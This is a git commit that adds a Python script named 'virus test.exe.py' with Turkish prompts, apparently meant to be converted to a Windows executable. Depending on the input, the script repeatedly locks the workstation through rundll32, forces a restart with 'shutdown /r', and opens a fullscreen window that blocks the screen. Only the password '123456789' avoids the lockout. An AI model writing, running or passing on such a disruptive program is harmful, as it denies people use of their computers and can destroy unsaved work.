e034a930512dee762822e8be6f9b75e823e1029b
eroge-69 <erogexunamed@gmail.com>
2025-08-17 02:16:52 +0700

    Upload virus test.exe.py via PY to EXE tool

---
+++ python-files/virus test.exe.py
@@ -0,0 +1,58 @@
+import os
+import sys
+
+###########################################################main.py
+
+
+
+print ('')
+
+print ('  ')
+    
+
+print ('')
+
+
+vir = input ('aç/açma: ')                                               
+if vir == 'aç':                                                         
+    for i in range(1, 20):                                              
+        import os                                                         
+        os.system("rundll32.exe user32.dll, LockWorkStation")
+        import os
+        os.system('shutdown /r')
+        from tkinter import *
+        root=Tk()
+        root.attributes('-fullscreen',True)
+        root.mainloop()
+    
+if vir == 'açma':
+    for i in range(1, 20):                                              
+        import os                                                       
+        os.system("rundll32.exe user32.dll, LockWorkStation")
+        
+print ('---------------------------------------------------------------')
+       
+##################################################################################
+#
+#f
+###############################33
+
+if vir == '123456789':
+       print ('devre dısı')
+
+else:
+    print ('sifre gecersiz')
+    for i in range(1, 20):
+        import os
+        os.system("rundll32.exe user32.dll, LockWorkStation")
+        from tkinter import *
+        root=Tk()
+        root.attributes('-fullscreen',True)
+        root.mainloop()
+        
+
+        
+for i in range(1, 1000):
+    import random
+    print ('q',random.randint (0, 1))
+    
